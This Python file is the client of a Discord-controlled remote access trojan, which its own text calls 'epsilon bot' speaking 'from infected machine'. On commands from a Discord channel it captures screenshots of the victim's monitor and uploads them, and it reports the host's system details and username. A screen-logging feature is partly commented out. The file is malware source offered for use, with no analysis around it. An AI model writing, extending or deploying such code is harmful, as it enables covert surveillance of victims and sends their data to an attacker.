import discord
import asyncio
from payloads.satelite import collectimage
import os
import platform
import sys
import threading

bot_token = ""

machine_data = platform.uname()

def init_bot(token):
    global bot_token
    bot_token = token


e_bot = discord.Client()
f_imglog = False
interval_imglog = 6 # seconds
"""def startimglog():
    if f_imglog:

        if collectimage():
            await e_bot.send_file(message.channel,path+'tempic.png')
        threading.Timer(interval_imglog,startimglog)
    else:
        pass
"""
@e_bot.event
async def on_ready():
    await e_bot.change_presence(game=discord.Game(name=machine_data[1]))
    
    
@e_bot.event
async def on_message(message):
    
    if message.content.startswith('$getpic'):    
        if sys.platform == "win32":
            path =  os.path.expandvars("%userprofile%") +'\\Documents\\'
        else:
            path = os.path.expanduser('~')
            
            print(path)

            if collectimage():
                await e_bot.send_file(message.channel,path+'tempic.png')
            else:
                await e_bot.send_message(message.channel,"[Error] : Couldn't grab pic :( ")
    
    #elif  message.content.startswith('$startimglog'):
     #   f_imglog = True
      #  threading.Timer(interval_imglog,startimglog)
    
    elif message.content.startswith('$stopimglog'):
        f_imglog = False


    elif message.content.startswith('$status'):
        await e_bot.send_message(message.channel,"Hello i'm epsilon bot by Sreyas i'm currently speaking from infected machine " + os.getlogin())
        buffer_data_system = "```* System : " + machine_data[0] + "\n* Node : " + machine_data[1] + "\n* Release : " + machine_data[2] + "\n* Version : " + machine_data[3] + "\n* Machine : " + machine_data[4] + "\n* Processor : " + machine_data[5] + "\n* Username : " + os.getlogin() +  "```"
        await e_bot.send_message(message.channel,buffer_data_system)
    
    elif message.content.startswith('$help'):
        buffer_data_help = """
**Commands**\n
\n
* **$getpic**      - grabs pic from machine's monitor\n 
* **$help**        - this dialog\n 
* **$startimglog** - starts logging image from machine\n
* **$stopsimglog** - stops logging image from machine\n
* **$status**      - shows details regarding infected machine\n 

"""
        await e_bot.send_message(message.channel,buffer_data_help)
    
    else:
        pass
       
def runbot():
    e_bot.run(bot_token)


